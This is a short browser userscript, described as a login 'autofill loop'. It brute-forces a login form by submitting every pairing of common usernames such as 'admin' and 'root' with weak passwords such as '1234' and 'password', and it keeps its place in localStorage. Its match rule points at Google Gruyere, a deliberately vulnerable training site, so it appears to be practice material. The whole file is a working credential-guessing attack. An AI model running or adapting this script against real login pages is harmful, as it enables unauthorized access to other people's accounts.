// ==UserScript==
// @name         Simple Login Autofill Loop
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  A simple script to autofill login forms with a list of usernames and passwords.
// @author       You
// @match        https://google-gruyere.appspot.com/457824571681310408699596197570313609331/*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const usernames = ["admin", "user", "test", "guest", "root", "admin1", "user1", "test1", "guest1"];
    const passwords = ["1234", "password", "admin", "letmein", "qwerty", "abc123", "welcome", "123456", "password1"];

    // Retrieve the current indices from localStorage or initialize them
    let i = parseInt(localStorage.getItem('usernameIndex')) || 0;
    let j = parseInt(localStorage.getItem('passwordIndex')) || 0;

    const interval = setInterval(() => {
        const userInput = document.querySelector("input[name='uid']");
        const passInput = document.querySelector("input[name='pw']");
        const button = document.querySelector("input[type='submit']");

        userInput.value = usernames[i];
        passInput.value = passwords[j];
        console.log(`Trying: ${usernames[i]} / ${passwords[j]}`);
        button.click();

        // Update indices
        j++;
        if (j >= passwords.length) {
            j = 0;
            i++;
        }
        if (i >= usernames.length) {
            clearInterval(interval);
            console.log("All combinations tried.");
            localStorage.removeItem('usernameIndex');
            localStorage.removeItem('passwordIndex');
            return;
        }

        // Save the current indices to localStorage
        localStorage.setItem('usernameIndex', i);
        localStorage.setItem('passwordIndex', j);
    }, );
})();
